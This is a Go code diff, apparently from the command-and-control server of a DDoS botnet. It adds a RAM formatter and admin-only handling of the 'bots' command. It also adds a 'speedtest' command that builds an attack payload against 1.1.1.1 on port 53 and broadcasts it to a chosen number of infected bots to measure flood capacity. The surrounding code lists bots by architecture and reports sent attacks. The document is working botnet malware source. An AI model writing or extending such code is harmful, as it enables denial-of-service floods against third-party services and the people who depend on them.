@@ -4,12 +4,11 @@ import (
 	"fmt"
 	"io/ioutil"
 	"net"
+	"net/http"
+	"net/url"
 	"strconv"
 	"strings"
 	"time"
-
-	"net/http"
-	"net/url"
 
 	"github.com/alexeyco/simpletable"
 )
@@ -36,6 +35,15 @@ const (
 	loginUsernameMaxAttempts = 2
 	loginPasswordMaxAttempts = 2
 )
+
+func formatRAM(mb uint64) string {
+	if mb >= 1024*1024 {
+		return fmt.Sprintf("%.2f TB", float64(mb)/(1024*1024))
+	} else if mb >= 1024 {
+		return fmt.Sprintf("%.2f GB", float64(mb)/1024)
+	}
+	return fmt.Sprintf("%d MB", mb)
+}
 
 func redGradientText(s string) string {
 	gradient := []string{
@@ -643,30 +651,94 @@ func AdminSSH(conn net.Conn) {
 
 			// Bots command
 			//==============================================================================================================================================================================================================================================================================================================================//
-
 		case "bots":
 			if !session.User.Admin {
-				session.Conn.Write([]byte(fmt.Sprintf("%sTotal%s %s%d%s\r\n", ansiSeparator, ansiReset, ansiNumbers, len(Clients), ansiReset)))
+				writeLine(session.Conn, "You do not have permission to use this command.")
+				continue
+			}
+			handleBots(session.Conn, session, command)
+			continue
+
+			//speed command
+
+		case "speedtest":
+			if !session.User.Admin {
+				writeLine(session.Conn, "You do not have permission to use this command.")
+				continue
+			}
+			args := strings.Fields(command)
+			maxBots := len(Clients)
+			for _, a := range args[1:] {
+				if strings.HasPrefix(a, "bots=") {
+					n, err := strconv.Atoi(a[5:])
+					if err == nil && n > 0 {
+						maxBots = n
+					}
+				}
+			}
+
+			// Inicializar variables de speedtest
+			speedtestMutex.Lock()
+			speedtestActive = true
+			speedtestTotalMbps = 0
+			speedtestCount = 0
+			if speedtestResults == nil {
+				speedtestResults = make(map[int]uint32)
+			} else {
+				// Limpiar resultados anteriores
+				for k := range speedtestResults {
+					delete(speedtestResults, k)
+				}
+			}
+			speedtestMutex.Unlock()
+
+			// Preparar ataque .speedtest
+			attackCmd := ".speedtest 1.1.1.1 5 dport=53"
+			parts := strings.Fields(attackCmd)
+			method, ok := IsMethod(".speedtest")
+			if !ok {
+				writeLine(session.Conn, "Internal error: speedtest method not found")
+				// Desactivar speedtest
+				speedtestMutex.Lock()
+				speedtestActive = false
+				speedtestMutex.Unlock()
+				continue
+			}
+			payload, err := method.Parse(parts, session.User, maxBots)
+			if err != nil {
+				writeLine(session.Conn, "Failed: "+err.Error())
+				speedtestMutex.Lock()
+				speedtestActive = false
+				speedtestMutex.Unlock()
+				continue
+			}
+			data, err := payload.Bytes()
+			if err != nil {
+				writeLine(session.Conn, "Failed to build attack")
+				speedtestMutex.Lock()
+				speedtestActive = false
+				speedtestMutex.Unlock()
 				continue
 			}
 
-			// Agrupar por arquitectura
-			archCount := make(map[string]int)
-			for _, c := range Clients {
-				arch := c.Arch
-				if arch == "" {
-					arch = "unknown"
-				}
-				archCount[arch]++
+			// Enviar ataque
+			if maxBots >= len(Clients) {
+				BroadcastClients(data)
+			} else {
+				BroadcastClientsFraction(data, maxBots)
 			}
 
-			indent := "  " // dos espacios, igual que en ataque
+			writeLine(session.Conn, fmt.Sprintf("Speedtest started with %d bots.", maxBots))
 
-			session.Conn.Write([]byte(indent + ansiSystem + "•" + ansiReset + " " + ansiCommands + "Bots by architecture:" + ansiReset + "\r\n"))
-			for arch, count := range archCount {
-				session.Conn.Write([]byte(indent + ansiSystem + "•" + ansiReset + " " + ansiCommands + arch + ansiReset + ansiSystem + ":" + ansiReset + "\t" + ansiCommands + "[" + strconv.Itoa(count) + "]" + ansiReset + "\r\n"))
-			}
-			session.Conn.Write([]byte(indent + ansiSystem + "•" + ansiReset + " " + ansiCommands + "Total" + ansiReset + ansiSystem + ":" + ansiReset + "\t" + ansiCommands + "[" + strconv.Itoa(len(Clients)) + "]" + ansiReset + "\r\n"))
+			// Goroutine para esperar y finalizar
+			go func(conn net.Conn, expected int) {
+				time.Sleep(15 * time.Second)
+				speedtestMutex.Lock()
+				speedtestActive = false
+				// No limpiamos los resultados para que la barra siga mostrando la última capacidad
+				speedtestMutex.Unlock()
+
+			}(session.Conn, maxBots)
 			continue
 
 			//Servers L7
@@ -1787,7 +1859,7 @@ func AdminSSH(conn net.Conn) {
 
 			botsDisplay := fmt.Sprintf("[%d/%d]", botsToUse, totalBots)
 
-			indent := "  " // dos espacios, ajustable
+			indent := "  "
 
 			session.Conn.Write([]byte(indent + ansiSystem + "•" + ansiReset + " " + ansiCommands + "Attack Sent!" + ansiReset + "\r\n"))
 			session.Conn.Write([]byte(indent + ansiSystem + "•" + ansiReset + " " + ansiCommands + "Method" + ansiReset + ansiSystem + ":" + ansiReset + "\t" + ansiCommands + "[" + methodDisplay + "]" + ansiReset + "\r\n"))
